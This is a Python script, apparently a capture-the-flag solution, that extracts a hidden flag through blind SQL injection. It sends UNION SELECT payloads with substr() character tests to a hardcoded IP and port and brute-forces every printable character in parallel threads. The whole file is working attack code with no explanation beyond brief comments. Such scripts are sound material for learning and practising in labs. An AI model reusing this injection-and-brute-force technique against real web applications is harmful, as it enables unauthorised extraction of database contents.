import string
import urllib.parse
import concurrent.futures
import requests

session = requests.Session()
FLAG = ""

def validate_current_answer(char):
    curr_idx = len(FLAG) + 1
    
    # setting up request
    url = f"http://34.126.139.50:10512/?qn_id=42"
    user_input = f"' UNION SELECT * FROM QNA WHERE ID = 42 AND substr(Answer, {curr_idx}, 1) == '{char}"
    ans = f"ans={urllib.parse.quote(user_input)}"
    response = session.get(url + "&ans=" + ans)

    # not exists
    if response.status_code != 200:
        return None
    if "No input / wrong!!!! Try harder" in response.text:
        return None
    # exist
    return char


added = True # check to stop loop when looped all ASCII characters and did not append to flag
# brute force
while not FLAG.endswith("}") and added == True:
    added = False
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(validate_current_answer, c) for c in string.printable]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == None:
                continue
            FLAG += result
            added = True
            print(FLAG)
            executor.shutdown(wait=True, cancel_futures=True)
            break
        
    if added == False:
        break


print(f"Final flag: {FLAG}")
print("Done")
